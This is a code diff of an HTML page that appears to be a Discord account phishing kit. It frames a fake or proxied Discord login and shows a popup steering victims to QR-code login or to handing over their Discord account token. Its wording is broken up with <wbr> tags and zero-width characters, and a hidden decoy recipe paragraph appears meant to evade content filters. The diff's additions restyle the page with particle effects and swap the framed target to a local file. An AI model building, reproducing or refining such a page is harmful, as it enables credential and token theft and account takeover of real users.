@@ -10,6 +10,8 @@
 
 :D">
     <link rel="icon" type="image/png" sizes="32x32" href="assets/img/i.png">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat+Alternates">
+    <link rel="stylesheet" href="/assets/css/styles.css">
     <style type="text/css">
         body,
         html {
@@ -19,6 +21,8 @@
             overflow: hidden;
         }
     </style>
+    <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+    <script src="assets/js/part-bg.js"></script>
 </head>
 
 <body>
@@ -36,9 +40,9 @@
     </script>
     <span style=display:none data-cook=hehe>Cooking at a higher temperature (500 degrees F (260 degrees C)) is the key to making this the perfect pizza. It doesn't get any easier than this folks. Brush dough with olive oil and add your favorite toppings. Enjoy! By Michele Leigh Pinette Pierce</span>
     <div id="ac-wrapper" style='display:none'>
-        <div id="popup">
+        <div class="d-popupbg" id="popup">
             <center>
-                <h2>Use QR to log<wbr>in with Dis<wbr>cord. You will need a mobile device for this. You can also try to use t<wbr>oken l<wbr>ogin. Search up on YT on how to find your Dis<wbr>cord tok<wbr>en.</h2>
+                <h2 id="particles-js">Q<wbr>R code is the most recommended method of logging in that will require a mobile device. An alternative method is tok<wbr>en login, which will require you to use your Dis<wbr>cord account token.</h2>
                 <input type="submit" name="submit" value="Got It" onClick="PopUp('hide')" />
             </center>
         </div>
@@ -46,7 +50,7 @@
     <!-- Frame  -->
     <iframe id="frame" width="100%" height="100%" style="border:none;overflow:hidden" scrolling="yes" frameborder="0" allowTransparency="true" allowfullscreen="true"></iframe>
     <script>
-        document.getElementById("frame").src = `//p.${document.domain}/https://dis&#8203;cord.com/login`;
+        document.getElementById("frame").src = `/a.html`;
     </script>
 </body>
 
